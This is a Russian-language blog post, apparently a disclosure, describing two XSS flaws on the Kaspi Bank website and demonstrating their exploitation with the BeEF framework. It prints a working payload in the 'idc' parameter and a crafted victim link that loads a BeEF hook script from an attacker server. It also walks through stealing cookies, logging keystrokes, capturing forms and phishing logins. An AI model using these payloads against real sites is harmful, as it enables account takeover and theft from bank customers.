---
layout: post
title: "Уязвимость в Kaspi Bank (XSS+BeEF)"
date: '2015-12-03T23:28:19+06:00'
categories: bank security xss
about: 'about.html'
---
О проблемах я сообщил Каспи банку 18 дней назад. Длинный пост поделен на 2 части: обсуждение двух XSS уязвимостей на сайте банка и знакомство с BeEF.
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

Первый XSS вектор - это неправильная обработка параметра **idc**.

hxxps://kaspi.kz/payments?**idc=78xx&quot;/&gt;&lt;script&gt;confirm(&lsquo;xss%20kaspi&rsquo;);&lt;/script&gt;&lt;meta%20x=“**
![image][img0]

Результат: постоянный (persistent) XSS, который сохраняется в течение всей сессии, даже если вы перейдете на другую страницу банка.
![image][img1]

***

Следующая уязвимость находится в поиске магазина. Сайт фильтрует многие тэги и атрибуты типа *script*, *src*, *onerror*, но 
не **object** и **data**. Мы можем вставить наш код, создав новый объект.

Здесь использую демо код с jsfiddle.net.
![image][img2]

Можно также создать объект с вредоносным PDF, Java, Flash или например простой картинкой.
![image][img3]

***

Теперь обсудим насколько легко использовать эти уязвимости.

>[The Browser Exploitation Framework] (BeEF) – это средство для эксплуатаций браузеров 
которое содержит набор модулей.

BeEF “цепляет&quot; браузер жертвы с помощью javascript кода, что позволяет выполнять различные действия. Браузер может быть настольным или 
мобильным.
![image][img4]

Вообще BeEF умеет делать очень продвинутые вещи (снимок с веб-камеры, запись аудио, атака на роутер и LAN, создание прокси и т.д.), но мы будем 
использовать модули для угона аккаунта и “развода” на деньги.

Готовим cсылку для жертвы: hxxps://kaspi.kz/payments?idc=666&quot;/&gt;&lt;script src=&ldquo;**http://192.168.1.111:3000/hook.js**&rdquo;&gt;&lt;/script&gt;&lt;meta o=&ldquo;

- **kaspi.kz** – сайт куда вставляется зацепка для BeEF (hook)
- **192.168.1.111** – сервер на котором установлен BeEF
- **192.168.1.1** – IP адрес жертвы

Такую ссылку можно отправить пользователю банка, админу или CEO (так как сайт банка использует *HTTPS*, настоящие мошенники загрузят 
скрипт-зацепку на *HTTPS* сайт, чтобы браузер жертвы не жаловался на активное смешанное содержимое).

Отправив ссылку, нужно зайти на наш сервер. BeEF идет вместе с удобной админ-панелью (логин/пароль по умолчанию *beef/beef*).
![image][img5]

После авторизаций, вы имеете доступ ко всем “зацепленным” браузерам. Здесь вы видите куки, данные ОС, список плагинов и т.д.
![image][img6]

Вы также видите, что делает жертва на странице (неплохой кейлогер).
![image][img7]

Тем временем, пользователь ничего не подозревает&hellip;
![image][img8]

Но нам необязательно читать журнал событий, ведь перехват данных формы не составляет большого труда. Есть готовый модуль.
![image][img9]

Вы всегда можете разработать свой модуль для BeEF. Также, многие модули идут с шаблонами, которые легко изменить под себя. Далее, пример показа всплывающего окна для перехвата пары логин/пароль.
![image][img10]

У вас есть возможность видеть содержимое браузера жертвы. То есть можете скачать весь HTML код либо сделать скриншот реальной страницы.
![image][img11]

Пример редактирования конкретного компонента страницы.
![image][img12]

Авторы модулей для BeEF – люди не без юмора.
![image][img13]

Вот и все. Надеюсь разработчики и владельцы сайтов теперь понимают чем может обернуться для пользователей простой или постоянный XSS.

**P.S.**
Был ли заражен ваш браузер в прошлом, можно проверить [здесь].

[The Browser Exploitation Framework]: https://github.com/beefproject/beef/wiki 
[здесь]: https://goo.gl/SsAhv
[img0]: /assets/images/{{page.slug}}/img0.png
[img1]: /assets/images/{{page.slug}}/img1.png
[img2]: /assets/images/{{page.slug}}/img2.png
[img3]: /assets/images/{{page.slug}}/img3.png
[img4]: /assets/images/{{page.slug}}/img4.png
[img5]: /assets/images/{{page.slug}}/img5.png
[img6]: /assets/images/{{page.slug}}/img6.png
[img7]: /assets/images/{{page.slug}}/img7.png
[img8]: /assets/images/{{page.slug}}/img8.png
[img9]: /assets/images/{{page.slug}}/img9.png
[img10]: /assets/images/{{page.slug}}/img10.png
[img11]: /assets/images/{{page.slug}}/img11.png
[img12]: /assets/images/{{page.slug}}/img12.png
[img13]: /assets/images/{{page.slug}}/img13.png